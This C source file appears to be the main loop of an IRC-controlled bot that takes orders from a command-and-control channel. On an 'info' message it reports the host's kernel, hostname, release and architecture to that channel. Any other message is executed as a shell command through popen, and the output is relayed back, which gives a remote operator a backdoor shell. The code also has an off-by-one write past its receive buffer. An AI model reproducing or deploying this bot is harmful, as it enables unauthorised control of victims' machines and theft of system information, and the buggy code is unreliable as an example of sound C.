/*	et_main_loop.c
	Author: William Woodruff
	------------------------
	The primary function used by et to send/receive data.
*/

#include "../cnc_info.h"
#include <string.h>
#include <stdio.h>
#include <sys/utsname.h>

void et_main_loop(int socket, char *nick)
{
	char buf[1024];

	while(1)
	{
		recv(socket, buf, 1023, 0);
		buf[1024] = '\0';

		char *ping;
		if ((ping = strstr(buf, "PING")) && !(strstr(buf, "CASEMAPPING")))
		{
			char *pong = strtok(ping, "\r\n");
			strncpy(pong, "PONG", 4);
			send(socket, pong, strlen(pong), 0);
		}
		else if (strstr(buf, "PRIVMSG") && strstr(buf, nick))
		{
			char *line = strtok(buf, "\r\n");
			char *cmd = strrchr(line, ':');
			cmd++;

			if (!strcmp(cmd, "quit"))
			{
				break; /* back to main@et_nix.c */
			}
			else if (!strcmp(cmd, "info"))
			{
				struct utsname sys_info;
				uname(&sys_info);

				char sysname[512];
				char nodename[512];
				char release[512];
				char version[512];
				char machine[512];

				snprintf(sysname, 512, "%s%s%s%s%s", "PRIVMSG ", IRC_CHANNEL, " :Kernel: ", sys_info.sysname, "\r\n");
				send(socket, sysname, strlen(sysname), 0);

				snprintf(nodename, 512, "%s%s%s%s%s", "PRIVMSG ", IRC_CHANNEL, " :Host: ", sys_info.nodename, "\r\n");
				send(socket, nodename, strlen(nodename), 0);
				
				snprintf(release, 512, "%s%s%s%s%s", "PRIVMSG ", IRC_CHANNEL, " :Release: ", sys_info.release, "\r\n");
				send(socket, release, strlen(release), 0);

				snprintf(version, 512, "%s%s%s%s%s", "PRIVMSG ", IRC_CHANNEL, " :Version: ", sys_info.version, "\r\n");
				send(socket, version, strlen(version), 0);

				snprintf(machine, 512, "%s%s%s%s%s", "PRIVMSG ", IRC_CHANNEL, " :Arch: ", sys_info.machine, "\r\n");
				send(socket, machine, strlen(machine), 0);
			}
			else
			{
				char cmd_output[512];
				char cmd_message[1024];

				FILE *output_file = popen(cmd, "r");
				fgets(cmd_output, 512, output_file);
				snprintf(cmd_message, 1024, "PRIVMSG %s :%s\r\n", IRC_CHANNEL, cmd_output);
				send(socket, cmd_message, strlen(cmd_message), 0);
				pclose(output_file);
			}
		}
	}
}
